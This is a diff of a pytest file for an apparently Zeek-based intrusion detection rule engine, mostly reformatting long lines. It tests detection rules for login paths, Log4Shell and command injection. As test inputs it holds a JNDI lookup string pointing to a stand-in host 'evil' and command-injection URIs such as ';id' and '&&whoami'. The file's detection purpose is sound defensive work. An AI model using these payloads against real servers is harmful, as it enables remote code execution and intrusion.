@@ -87,7 +87,9 @@ def test_every_rule_field_exists(mods: dict[str, Any]) -> None:
 
 
 def test_every_rule_regex_compiles(mods: dict[str, Any]) -> None:
-    bad = [(r["name"], mods["engine"].validate_rule_regexes(r)) for r in mods["builtin"].BUILTIN_RULES]
+    bad = [
+        (r["name"], mods["engine"].validate_rule_regexes(r)) for r in mods["builtin"].BUILTIN_RULES
+    ]
     assert [b for b in bad if b[1]] == []
 
 
@@ -104,7 +106,10 @@ def test_routing_is_globally_priority_sorted(mods: dict[str, Any]) -> None:
         "conditions": {"rules": [{"field": "src_ip", "op": "exists"}]},
     }
     index = mods["engine"].build_rule_index([wild, typed])
-    assert [r["name"] for r in mods["engine"].rules_for_log_type(index, "http")] == ["t-wild", "t-typed"]
+    assert [r["name"] for r in mods["engine"].rules_for_log_type(index, "http")] == [
+        "t-wild",
+        "t-typed",
+    ]
 
 
 def test_match_hardening(mods: dict[str, Any]) -> None:
@@ -173,7 +178,13 @@ def test_sshd_group_no_longer_means_brute_force(mods: dict[str, Any]) -> None:
 
 def test_login_path_regex_covers_common_forms(mods: dict[str, Any]) -> None:
     pattern = mods["config"].settings.web_login_path_regex
-    for path in ("/login.php", "/wp-login.php", "/admin/login.do", "/api/v2/authenticate", "/user/sign_in"):
+    for path in (
+        "/login.php",
+        "/wp-login.php",
+        "/admin/login.do",
+        "/api/v2/authenticate",
+        "/user/sign_in",
+    ):
         assert re.search(pattern, path), path
     for path in ("/mylogin", "/static/app.js"):
         assert not re.search(pattern, path), path
@@ -185,7 +196,10 @@ def test_login_path_regex_covers_common_forms(mods: dict[str, Any]) -> None:
 def test_log4shell_word_boundary_and_header_vector(mods: dict[str, Any]) -> None:
     rule = _by_name(mods["builtin"].BUILTIN_RULES, "内置-表达式注入与JNDI(Log4Shell)")
     # 无词边界时 `/api/spellcheck` 会报 critical
-    assert mods["engine"].match_rule(rule, _entry(mods, {**_HTTP, "uri": "/api/spellcheck"}, "http")) is False
+    assert (
+        mods["engine"].match_rule(rule, _entry(mods, {**_HTTP, "uri": "/api/spellcheck"}, "http"))
+        is False
+    )
     # CVE-2021-44228 的头注入向量（Zeek 的头值只在 req_headers 里）
     hit = _entry(mods, {**_HTTP, "req_headers": "USER-AGENT: ${jndi:ldap://evil/x}"}, "http")
     assert mods["engine"].match_rule(rule, hit) is True
@@ -194,7 +208,9 @@ def test_log4shell_word_boundary_and_header_vector(mods: dict[str, Any]) -> None
 def test_command_injection_without_trailing_space(mods: dict[str, Any]) -> None:
     rule = _by_name(mods["builtin"].BUILTIN_RULES, "内置-命令注入特征")
     for payload in ("/x?a=1;id", "/x?a=1|id", "/x?a=1&&whoami"):
-        assert mods["engine"].match_rule(rule, _entry(mods, {**_HTTP, "uri": payload}, "http")), payload
+        assert mods["engine"].match_rule(rule, _entry(mods, {**_HTTP, "uri": payload}, "http")), (
+            payload
+        )
     assert (
         mods["engine"].match_rule(rule, _entry(mods, {**_HTTP, "uri": "/x?a=1"}, "http")) is False
     )
@@ -232,7 +248,10 @@ def test_no_always_true_rule_conditions(mods: dict[str, Any]) -> None:
 @pytest.mark.parametrize(
     ("log_type", "fields"),
     [
-        ("conn", {**_CONN, "id.resp_p": 443, "conn_state": "SF", "orig_bytes": 1200, "resp_bytes": 3400}),
+        (
+            "conn",
+            {**_CONN, "id.resp_p": 443, "conn_state": "SF", "orig_bytes": 1200, "resp_bytes": 3400},
+        ),
         ("http", {**_HTTP, "uri": "/index.html", "method": "GET", "status_code": 200}),
     ],
 )
@@ -291,9 +310,9 @@ def test_rule_cap_and_severity_order(request: pytest.FixtureRequest) -> None:
     client = _Fake()
     stats: Any = __import__("collections").Counter()
     cap = runner.settings.detector_max_digests_per_rule_minute
-    items = [
-        (f"p{i}", {"rule": "噪声规则", "rule_severity": "medium"}) for i in range(cap + 3)
-    ] + [("hi", {"rule": "勒索", "rule_severity": "critical"})]
+    items = [(f"p{i}", {"rule": "噪声规则", "rule_severity": "medium"}) for i in range(cap + 3)] + [
+        ("hi", {"rule": "勒索", "rule_severity": "critical"})
+    ]
     kept, dropped = runner._cap_per_rule(client, items, stats)
     assert len(dropped) == 3
     assert stats["dropped_rule_capped"] == 3
